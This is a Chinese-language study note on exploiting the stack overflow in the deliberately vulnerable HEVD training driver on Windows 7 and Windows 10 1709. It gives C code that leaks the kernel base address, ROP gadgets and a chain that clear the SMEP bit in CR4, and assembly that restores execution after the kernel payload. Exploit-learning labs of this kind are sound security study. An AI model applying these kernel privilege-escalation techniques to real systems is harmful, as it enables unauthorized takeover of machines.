## Win7

为了让程序继续正常运行，运行完payload需要进行栈帧平衡。即`BufferOverflowStackIoctlHandler`函数结尾那样。

```assembly
add rsp, 28h
ret
```

## Win10 1709

16299.15.amd64fre.rs3_release.170928-1534

### Get nt base address 

1. EnumDrivers 

   ```c
   LPVOID addresses[1000];
   DWORD needed;
   
   EnumDeviceDrivers(addresses, 1000, &needed);
   
   printf("[+] Address of ntoskrnl.exe: 0x%p\n", addresses[0]);
   ```

2. NtQuerySystemInformation

   ```c
   PUCHAR GetKernelBase()
   {
   	DWORD len;
   	PSYSTEM_MODULE_INFORMATION ModuleInfo;
   	PUCHAR kernelBase = NULL;
   
   	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
   		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
   	if (NtQuerySystemInformation == NULL) {
   		return NULL;
   	}
   
   	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
   	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   	if (!ModuleInfo)
   	{
   		return NULL;
   	}
   
   	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
   
   	kernelBase = ModuleInfo->Module[0].ImageBase;
   	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
   
   	return kernelBase;
   }
   ```

   

### ROP bypass SMEP

**gadget1**

```
kd> uf nt!KiConfigureDynamicProcessor
nt!KiConfigureDynamicProcessor:
fffff801`56024ba8 4883ec28        sub     rsp,28h
fffff801`56024bac e89773ffff      call    nt!KiEnableXSave (fffff801`5601bf48)
fffff801`56024bb1 4883c428        add     rsp,28h
fffff801`56024bb5 c3              ret
kd> uf fffff801`5601bf48
... snip ...

nt!KiEnableXSave+0x39b0:
fffff802`2cc318f8 btr     rcx,12h
fffff802`2cc318fd mov     cr4,rcx       // First gadget!
fffff802`2cc31900 ret
kd> ? fffff801`5601f8fd - nt
Evaluate expression: 4323581 = 00000000`0041f8fd
```

**gadget2**

```
kd> uf HvlEndSystemInterrupt
nt!HvlEndSystemInterrupt:
fffff801`55d5fc50 4851            push    rcx
fffff801`55d5fc52 50              push    rax
fffff801`55d5fc53 52              push    rdx
fffff801`55d5fc54 65488b142508620000 mov   rdx,qword ptr gs:[6208h]
fffff801`55d5fc5d b970000040      mov     ecx,40000070h
fffff801`55d5fc62 0fba3200        btr     dword ptr [rdx],0
fffff801`55d5fc66 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff801`55d5fc6e)  Branch

nt!HvlEndSystemInterrupt+0x18:
fffff801`55d5fc68 33c0            xor     eax,eax
fffff801`55d5fc6a 8bd0            mov     edx,eax
fffff801`55d5fc6c 0f30            wrmsr

nt!HvlEndSystemInterrupt+0x1e:
fffff801`55d5fc6e 5a              pop     rdx
fffff801`55d5fc6f 58              pop     rax
fffff801`55d5fc70 59              pop     rcx         // Second gadget!
fffff801`55d5fc71 c3              ret

kd> ? fffff801`55d5fc70 - nt
Evaluate expression: 1440880 = 00000000`0015fc70
```

**ROP chain**

```
+------------------+
|pop rcx; ret      |	// nt + 0x15fc70
+------------------+
|value of rcx      |	// ? @cr4 & FFFFFFFF`FFEFFFFF
+------------------+
|mov cr4, rcx; ret |	// nt + 0x41f8fd
+------------------+
|addr of payload   |	// Available from user-mode
+------------------+
```

### Repair execution flow

> - The non-volatile registers are: RBX, RBP, RDI, RSI, RSP, R12, R13, R14, and R15. They must be preserved between function calls
> - The volatile registers are: RAX, RCX, RDX, R8, R9, R10, R11

**尝试直接返回`HEVD!IrpDeviceIoCtlHandler+0x1db`，失败。**

因为不止破坏了返回地址。在`TriggerBufferOverflowStack`函数开始保存了**rbx, rsi, rdi**，在末尾恢复。但在保存的位置已经被ROP的的地址给覆盖了。

逆向发现rbx, rsi, rdi在`IrpDeviceIoCtlHandler`中设置了固定的值，自行恢复好后依旧崩溃。猜测是R12, R14, R15的原因，特别是R14存放了一个地址，在win7那里没有发生问题。

```c
PAGE:FFFFF880064865B4 ; int __fastcall TriggerBufferOverflowStack(void *UserBuffer, unsigned __int64 Size)
PAGE:FFFFF880064865B4 TriggerBufferOverflowStack proc near    ; CODE XREF: BufferOverflowStackIoctlHandler+15↑p
PAGE:FFFFF880064865B4                                         ; DATA XREF: .pdata:FFFFF88006484150↑o
PAGE:FFFFF880064865B4
PAGE:FFFFF880064865B4 var_818         = byte ptr -818h
PAGE:FFFFF880064865B4 var_18          = byte ptr -18h
PAGE:FFFFF880064865B4 arg_0           = qword ptr  8
PAGE:FFFFF880064865B4 arg_8           = qword ptr  10h
PAGE:FFFFF880064865B4 arg_10          = qword ptr  18h
PAGE:FFFFF880064865B4
PAGE:FFFFF880064865B4 ; __unwind { // __C_specific_handler_0
PAGE:FFFFF880064865B4                 mov     [rsp+arg_0], rbx
PAGE:FFFFF880064865B9                 mov     [rsp+arg_8], rsi
PAGE:FFFFF880064865BE                 mov     [rsp+arg_10], rdi
    
   ......snip......
    
PAGE:FFFFF880064866A0 loc_FFFFF880064866A0:                   ; CODE XREF: TriggerBufferOverflowStack+CF↑j
PAGE:FFFFF880064866A0                 mov     eax, ebx
PAGE:FFFFF880064866A2                 lea     r11, [rsp+838h+var_18]
PAGE:FFFFF880064866AA                 mov     rbx, [r11+20h]
PAGE:FFFFF880064866AE                 mov     rsi, [r11+28h]
PAGE:FFFFF880064866B2                 mov     rdi, [r11+30h]
PAGE:FFFFF880064866B6                 mov     rsp, r11
PAGE:FFFFF880064866B9                 pop     r15
PAGE:FFFFF880064866BB                 pop     r14
PAGE:FFFFF880064866BD                 pop     r12
PAGE:FFFFF880064866BF                 retn
```

经过逆向和调试得到下方的恢复代码，与参考的几个exploit都不一样

```assembly
xor rax, rax

xor r12, r12
; xor r14, r14                 ; R14 will be restored in IrpDeviceIoCtlHandler
; xor r15, r15
xor rdi, rdi

add rsp, 10h                   ; Return to IrpDeviceIoCtlHandler
```

## Q&A

1. WinDbg(调试机中的DebugView) 不显示 `DbgPrint` 的信息

   在被调试机中的DebugView程序中，选中Capture->Enable Verbose Kernel Output，两侧就都能显示了。（会打印过多的信息！！...）

2. HEVD 驱动调试符号载入

   添加HEVD.pdb的路径。而后在Debug->Modules中找到并选中HEVD，然后点击reload。关闭该窗口后会显示其执行了如下命令

   ```
   .reload /f @"HEVD.sys"
   ```

## ERROR

ROP bypass SMEP中，设置CR4 为 0x70678，user code 运行中途会触发SMEP保护（目测）。。

设为0x506f8（原值：0x1506f8）即可

## Ref

1. [Kernel Exploit 2: Token Stealing Payload 注解](https://www.abatchy.com/2018/01/kernel-exploitation-2)
2. VS Studio 添加ASM [链接1](http://lallouslab.net/2016/01/11/introduction-to-writing-x64-assembly-in-visual-studio/) [链接2](https://zhuanlan.zhihu.com/p/31918676)
3. [HEVD Window Kernel Exploit 01 - StackOverflow](https://www.anquanke.com/post/id/218682)
4. [Windows内核漏洞学习之栈溢出-hevd第一篇](https://github.com/xinali/articles/issues/66)
5. [Kernel Exploit 4: Stack Overflow (bypass SMEP)](https://www.abatchy.com/2018/01/kernel-exploitation-4)
6. [SMEP: What is it, and how to beat it on Windows](https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/)

